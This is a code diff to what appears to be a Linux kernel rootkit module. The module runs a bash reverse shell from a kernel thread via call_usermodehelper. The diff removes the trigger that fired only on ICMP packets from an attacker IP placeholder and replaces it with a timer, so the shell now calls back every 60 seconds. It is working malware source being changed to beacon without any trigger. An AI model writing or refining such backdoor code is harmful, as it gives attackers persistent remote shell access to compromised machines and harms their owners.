@@ -14,36 +14,17 @@ int revshell_func(void *data) {
     char *argv[] = {"/bin/bash", "-c", revshellCmd, NULL};
 
     while (!kthread_should_stop()) {
-        if (execute_shell) {
-            call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
-            execute_shell = false;
-        }
-        ssleep(5);
+        // Execute reverse shell every 60 seconds (1 minute)
+        call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+        ssleep(60);  // Sleep for 60 seconds (1 minute)
     }
     return 0;
 }
 
 static asmlinkage int(*original_icmp_rcv)(struct sk_buff *skb);
 static asmlinkage int icmp_rcv_hook(struct sk_buff *skb) {
-    struct iphdr *iph;
-    u32 dest_ip;
-
-    if (!skb)
-        return NF_ACCEPT;
-
-    iph = ip_hdr(skb);
-
-    if (!iph)
-        return NF_ACCEPT;
-
-    if (!in4_pton(YOUR_SRV_IP, -1, (u8 *)&dest_ip, -1, NULL)) {
-        return NF_ACCEPT;
-    }
-
-    if (iph->saddr == dest_ip) {
-        execute_shell = true;
-    }
-
+    // ICMP hook is kept for compatibility but no longer triggers reverse shell
+    // Reverse shell now runs on a timer basis (every 1 minute)
     return original_icmp_rcv(skb);
 }
 
